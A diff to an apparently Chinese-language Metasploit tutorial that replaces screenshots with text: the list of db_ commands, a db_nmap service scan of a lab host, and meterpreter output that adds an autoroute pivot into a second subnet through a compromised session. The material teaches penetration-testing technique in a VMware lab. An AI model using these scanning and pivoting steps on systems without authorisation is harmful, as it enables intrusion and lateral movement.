@@ -169,7 +169,10 @@ msf > db_status
 
 数据库相关命令：
 
-![Screen Shot 2018-10-18 at 11.00.39 AM.png]({{ site.url }}/images/metasploit/7F42C56DA03D59913DD70BC6A5D79220.png)
+```
+msf > db_
+db_connect        db_disconnect     db_export         db_import         db_nmap           db_rebuild_cache  db_status
+```
 
 扫描：
 
@@ -177,8 +180,6 @@ msf > db_status
 # -sV: service scan -p: ports specified
 db_nmap -sV -p 21,22,25,80,110,443,445 172.16.56.130
 ```
-
-![Screen Shot 2018-10-18 at 11.03.34 AM.png]({{ site.url }}/images/metasploit/F9AA95FE365885363EAE38F981B9FCDD.png)
 
 结果会被自动存入数据库，可查看：
 
@@ -527,7 +528,26 @@ ARP cache
 
 其中`.254`是VMWare虚拟网络本身使用的地址。所以`.128`处有一台机器。我们在meterpreter中建立一个跳板：
 
-![Screen Shot 2018-10-18 at 2.43.38 PM.png]({{ site.url }}/images/metasploit/AD2932903AE20CE2F72E628977709E74.png)
+```
+meterpreter > run autoroute -s 192.168.6.0/24
+
+[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
+[!] Example: run post/multi/manage/autoroute OPTION=value [...]
+[*] Adding a route to 192.168.6.0/255.255.255.0...
+[+] Added route to 192.168.6.0/255.255.255.0 via 172.16.56.130
+[*] Use the -p option to list all active routes
+meterpreter > run autoroute -p
+
+[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
+[!] Example: run post/multi/manage/autoroute OPTION=value [...]
+
+Active Routing Table
+====================
+
+   Subnet             Netmask            Gateway
+   ------             -------            -------
+   192.168.6.0        255.255.255.0      Session 1
+```
 
 成功设置跳板。先将meterpreter切入后台：
 
